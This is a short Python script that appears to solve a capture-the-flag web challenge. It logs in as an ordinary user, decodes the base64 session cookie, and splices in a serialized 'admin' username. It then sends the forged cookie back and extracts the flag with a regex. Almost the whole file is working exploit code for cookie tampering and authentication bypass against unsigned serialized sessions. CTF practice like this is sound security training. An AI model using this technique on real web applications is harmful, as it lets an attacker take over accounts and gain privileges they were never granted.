#!/usr/bin/env python3
import base64
import re
import requests as r

url = "http://hackfest.redrocket.club:2001/"

# Request
req = r.Session()
data = {'user': 'foo'}
res = req.post(url, data=data, allow_redirects=True)

# Cookie
cookie = req.cookies.get_dict()
key = list(cookie.keys())[0]
value = cookie[key]

# Decode value
b64_bytes = value.encode('ascii')
value_bytes = base64.b64decode(b64_bytes)
value = value_bytes.decode('ascii')

# Crafting payload
name = "admin"
payload = value[0:27]+str(len(name))+":"+'"'+name+'";}'
payload = payload.encode('ascii')
payload = base64.b64encode(payload)
payload = payload.decode('ascii')

# Send payload
req = r.Session()
new_cookie = {key: payload}
res = req.get(res.url, cookies=new_cookie).text

# Grabbing flag
flag = re.findall(r'flag{\w*}', res)[0]

print(flag)
